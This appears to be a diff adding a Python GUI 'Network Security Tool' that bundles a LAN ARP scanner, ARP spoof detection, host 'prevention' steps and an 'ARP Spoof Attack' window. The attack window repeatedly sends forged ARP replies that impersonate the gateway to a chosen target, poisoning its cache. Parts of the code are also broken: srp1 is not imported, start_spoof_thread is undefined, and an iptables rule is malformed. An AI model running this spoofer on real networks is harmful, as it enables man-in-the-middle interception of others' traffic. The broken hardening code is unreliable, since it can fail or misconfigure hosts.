@@ -1,0 +1,331 @@
+import customtkinter as ctk
+import tkinter as tk
+from scapy.all import ARP, Ether, srp, sniff, IP, TCP, get_if_addr, conf, send
+import threading
+import datetime
+import concurrent.futures
+import scapy.all as scapy
+import subprocess
+import netifaces
+import time
+
+# Global Variables
+IP_MAC_PAIRS = {}
+ARP_REQ_TABLE = {}
+INTERFACE = "eth0"  # Update this if needed
+LOG_FILE = "/var/log/network_hardening.log"  # Change this path if necessary
+spoofing_active = False  # Flag to control spoofing state
+spoof_thread = None
+
+# Appearance setup
+ctk.set_appearance_mode("dark")
+ctk.set_default_color_theme("dark-blue")
+
+# ARP Prevention Functions
+def log_event(event):
+    with open(LOG_FILE, "a") as log_file:
+        log_file.write(f"{datetime.datetime.now()} - {event}\n")
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return answered_list[0][1].hwsrc if answered_list else None
+
+def get_default_gateway():
+    gateways = netifaces.gateways()
+    return gateways['default'][netifaces.AF_INET][0]
+
+def get_local_ip():
+    return netifaces.ifaddresses(INTERFACE)[netifaces.AF_INET][0]['addr']
+
+def get_local_mac():
+    return netifaces.ifaddresses(INTERFACE)[netifaces.AF_LINK][0]['addr']
+
+def populate_whitelist():
+    router_ip = get_default_gateway()
+    router_mac = get_mac(router_ip)
+    local_ip = get_local_ip()
+    local_mac = get_local_mac()
+
+    WHITELIST = {
+        router_ip: router_mac,
+        local_ip: local_mac
+    }
+    
+    event = f"[INFO] Whitelist populated: {WHITELIST}"
+    print(event)
+    log_event(event)
+
+    return WHITELIST
+
+def enforce_static_arp(WHITELIST):
+    for ip, mac in WHITELIST.items():
+        event = f"[INFO] Enforcing static ARP entry for IP {ip} with MAC {mac}."
+        print(event)
+        log_event(event)
+        subprocess.call(["arp", "-s", ip, mac])
+
+def harden_network():
+    print("[INFO] Hardening network settings.")
+    log_event("[INFO] Hardening network settings.")
+    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=0"])
+    subprocess.call(["sysctl", "-w", "net.ipv4.conf.all.arp_filter=1"])
+    subprocess.call(["sysctl", "-w", "net.ipv4.conf.default.arp_filter=1"])
+    subprocess.call(["iptables", "-A", "INPUT", "-p", "arp", "--arp-mac", "!", "-j", "DROP"])
+
+def start_arp_prevention():
+    result_entry.insert("end", "Starting ARP Prevention...\n")
+    whitelist = populate_whitelist()
+    enforce_static_arp(whitelist)
+    harden_network()
+    result_entry.insert("end", "[INFO] ARP Prevention completed.\n")
+
+# ARP Spoofing Functions
+def start_arp_spoof(target_ip, gateway_ip, interval):
+    global spoofing_active
+    spoofing_active = True
+    while spoofing_active:
+        send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=get_local_mac()), verbose=False)
+        time.sleep(interval)  # Delay for specified interval
+
+def stop_spoofing():
+    global spoofing_active
+    spoofing_active = False
+
+# ARP Spoof Detection Functions
+def sniff_requests():
+    sniff(filter='arp', lfilter=outgoing_req, prn=add_req, iface=conf.iface)
+
+def sniff_replays():
+    sniff(filter='arp', lfilter=incoming_reply, prn=check_arp_header, iface=conf.iface)
+
+def incoming_reply(pkt):
+    return pkt[ARP].psrc != str(get_if_addr(conf.iface)) and pkt[ARP].op == 2
+
+def outgoing_req(pkt):
+    return pkt[ARP].psrc == str(get_if_addr(conf.iface)) and pkt[ARP].op == 1
+
+def add_req(pkt):
+    ARP_REQ_TABLE[pkt[ARP].pdst] = datetime.datetime.now()
+
+def check_arp_header(pkt):
+    if not pkt[Ether].src == pkt[ARP].hwsrc or not pkt[Ether].dst == pkt[ARP].hwdst:
+        alarm('inconsistent ARP message')
+    return known_traffic(pkt)
+
+def known_traffic(pkt):
+    if pkt[ARP].psrc not in IP_MAC_PAIRS.keys():
+        return spoof_detection(pkt)
+    elif IP_MAC_PAIRS[pkt[ARP].psrc] == pkt[ARP].hwsrc:
+        return
+    return alarm('IP-MAC pair change detected')
+
+def spoof_detection(pkt):
+    ip_ = pkt[ARP].psrc
+    t = datetime.datetime.now()
+    mac = pkt[0][ARP].hwsrc
+    if ip_ in ARP_REQ_TABLE.keys() and (t - ARP_REQ_TABLE[ip_]).total_seconds() <= 5:
+        ip = IP(dst=ip_)
+        SYN = TCP(sport=40508, dport=40508, flags="S", seq=12345)
+        E = Ether(dst=mac)
+        if not srp1(E / ip / SYN, verbose=False, timeout=2):
+            alarm('No TCP ACK, fake IP-MAC pair')
+        else:
+            IP_MAC_PAIRS[ip_] = pkt[ARP].hwsrc
+    else:
+        send(ARP(op=1, pdst=ip_), verbose=False)
+
+def alarm(alarm_type):
+    result_entry.insert("end", f'Under Attack: {alarm_type}\n')
+
+def start_detection():
+    result_entry.insert("end", "ARP Spoofing Detection Started...\n")
+    threading.Thread(target=sniff_requests, daemon=True).start()
+    threading.Thread(target=sniff_replays, daemon=True).start()
+
+# Network Scanning Functions
+def arp_scan(ip):
+    arp_pack = ARP(pdst=ip)
+    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_req = ether_frame / arp_pack
+    result = srp(arp_req, timeout=2, verbose=False)[0]
+    devices = []
+    for sent, received in result:
+        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
+    return devices
+
+def scan_network(ip_range, threads=100):
+    ip_list = [f"{ip_range}.{i}" for i in range(1, 255)]
+    devices = []
+    
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = {executor.submit(arp_scan, ip): ip for ip in ip_list}
+        for future in concurrent.futures.as_completed(futures):
+            result = future.result()
+            if result:
+                devices.extend(result)
+    
+    return devices
+
+def show_confirmation_and_update():
+    ip_range = "192.168.1"  # Modify this range as needed
+    result_entry.insert("1.0", "Scanning network...\n")
+    devices = scan_network(ip_range)
+    result_entry.insert("end", f"Scan completed. {len(devices)} devices found.\n")
+    for device in devices:
+        result_entry.insert("end", f"IP: {device['ip']}, MAC: {device['mac']}\n")
+
+# GUI Functions
+def open_third_window():
+    global third_window
+    second_window.withdraw()
+    third_window = ctk.CTkToplevel()
+    third_window.title("Results Window")
+    third_window.geometry("600x450")
+
+    frame = ctk.CTkFrame(third_window, corner_radius=20)
+    frame.pack(pady=20, padx=20, fill="both", expand=True)
+
+    global result_entry
+    result_entry = ctk.CTkTextbox(frame, font=("Arial", 16))
+    result_entry.pack(pady=20, padx=20, fill="both", expand=True)
+
+    update_button = ctk.CTkButton(frame, text="Update Results", command=show_confirmation_and_update, width=200, height=40, font=("Arial", 14))
+    update_button.pack(pady=10)
+
+    back_button = ctk.CTkButton(frame, text="Back", command=lambda: go_back(third_window), width=200, height=40, font=("Arial", 14))
+    back_button.pack(pady=10)
+
+def open_fourth_window():
+    second_window.withdraw()
+    fourth_window = ctk.CTkToplevel()
+    fourth_window.title("Input Window")
+    fourth_window.geometry("600x450")
+
+    frame = ctk.CTkFrame(fourth_window, corner_radius=20)
+    frame.pack(pady=20, padx=20, fill="both", expand=True)
+
+    ip_target_label = ctk.CTkLabel(frame, text="Enter target IP address", font=("Arial", 16))
+    ip_target_label.pack(pady=10)
+    ip_target_entry = ctk.CTkEntry(frame, font=("Arial", 16))
+    ip_target_entry.pack(pady=10, padx=20, fill="x")
+
+    ip_gateway_label = ctk.CTkLabel(frame, text="Enter gateway IP address", font=("Arial", 16))
+    ip_gateway_label.pack(pady=10)
+    ip_gateway_entry = ctk.CTkEntry(frame, font=("Arial", 16))
+    ip_gateway_entry.pack(pady=10, padx=20, fill="x")
+
+    interval_label = ctk.CTkLabel(frame, text="Enter interval (seconds)", font=("Arial", 16))
+    interval_label.pack(pady=10)
+    interval_entry = ctk.CTkEntry(frame, font=("Arial", 16))
+    interval_entry.pack(pady=10, padx=20, fill="x")
+    interval_entry.insert(0, "4")  # Default value
+
+    def on_execute():
+        ip_target = ip_target_entry.get()
+        ip_gateway = ip_gateway_entry.get()
+        try:
+            interval = float(interval_entry.get())
+        except ValueError:
+            interval = 4
+        start_spoof_thread(ip_target, ip_gateway, interval)
+
+    def on_stop():
+        stop_spoofing()
+
+    action_button = ctk.CTkButton(frame, text="Start ARP Spoofing", command=on_execute, width=200, height=40, font=("Arial", 14))
+    action_button.pack(pady=10)
+
+    stop_button = ctk.CTkButton(frame, text="Stop ARP Spoofing", command=on_stop, width=200, height=40, font=("Arial", 14))
+    stop_button.pack(pady=10)
+
+    back_button = ctk.CTkButton(frame, text="Back", command=lambda: go_back(fourth_window), width=200, height=40, font=("Arial", 14))
+    back_button.pack(pady=10)
+
+def go_back(window):
+    window.destroy()
+    second_window.deiconify()
+
+def open_fifth_window():
+    second_window.withdraw()
+    fifth_window = ctk.CTkToplevel()
+    fifth_window.title("ARP Spoof Detection")
+    fifth_window.geometry("600x450")
+
+    frame = ctk.CTkFrame(fifth_window, corner_radius=20)
+    frame.pack(pady=20, padx=20, fill="both", expand=True)
+
+    global result_entry
+    result_entry = ctk.CTkTextbox(frame, font=("Arial", 16))
+    result_entry.pack(pady=20, padx=20, fill="both", expand=True)
+
+    action_button = ctk.CTkButton(frame, text="Start Detection", command=start_detection, width=200, height=40, font=("Arial", 14))
+    action_button.pack(pady=10)
+
+    back_button = ctk.CTkButton(frame, text="Back", command=lambda: go_back(fifth_window), width=200, height=40, font=("Arial", 14))
+    back_button.pack(pady=10)
+
+def open_prevention_window():
+    second_window.withdraw()
+    prevention_window = ctk.CTkToplevel()
+    prevention_window.title("ARP Prevention")
+    prevention_window.geometry("600x450")
+
+    frame = ctk.CTkFrame(prevention_window, corner_radius=20)
+    frame.pack(pady=20, padx=20, fill="both", expand=True)
+
+    global result_entry
+    result_entry = ctk.CTkTextbox(frame, font=("Arial", 16))
+    result_entry.pack(pady=20, padx=20, fill="both", expand=True)
+
+    prevention_button = ctk.CTkButton(frame, text="Start ARP Prevention", command=start_arp_prevention, width=200, height=40, font=("Arial", 14))
+    prevention_button.pack(pady=10)
+
+    back_button = ctk.CTkButton(frame, text="Back", command=lambda: go_back(prevention_window), width=200, height=40, font=("Arial", 14))
+    back_button.pack(pady=10)
+
+def open_second_window():
+    global second_window
+    first_window.withdraw()
+    second_window = ctk.CTkToplevel()
+    second_window.title("Main Menu")
+    second_window.geometry("600x450")
+
+    frame = ctk.CTkFrame(second_window, corner_radius=20)
+    frame.pack(pady=20, padx=20, fill="both", expand=True)
+
+    label = ctk.CTkLabel(frame, text="Choose an option", font=("Arial", 20, "bold"))
+    label.pack(pady=20)
+
+    button_1 = ctk.CTkButton(frame, text="Network Scanner", command=open_third_window, width=200, height=40, font=("Arial", 14))
+    button_1.pack(pady=10)
+
+    button_2 = ctk.CTkButton(frame, text="ARP Spoof Detection", command=open_fifth_window, width=200, height=40, font=("Arial", 14))
+    button_2.pack(pady=10)
+
+    prevention_button = ctk.CTkButton(frame, text="ARP Prevention", command=open_prevention_window, width=200, height=40, font=("Arial", 14))
+    prevention_button.pack(pady=10)
+
+    spoof_button = ctk.CTkButton(frame, text="ARP Spoof Attack", command=open_fourth_window, width=200, height=40, font=("Arial", 14))
+    spoof_button.pack(pady=10)
+
+    back_button = ctk.CTkButton(frame, text="Back", command=lambda: go_back(second_window), width=200, height=40, font=("Arial", 14))
+    back_button.pack(pady=10)
+
+def open_first_window():
+    global first_window
+    first_window = ctk.CTk()
+    first_window.title("Network Security Tool")
+    first_window.geometry("600x450")
+
+    label = ctk.CTkLabel(first_window, text="Welcome to the Network Security Tool", font=("Arial", 20, "bold"))
+    label.pack(pady=20)
+
+    start_button = ctk.CTkButton(first_window, text="Start", command=open_second_window, width=200, height=40, font=("Arial", 14))
+    start_button.pack(pady=20)
+
+    first_window.mainloop()
+
+open_first_window()
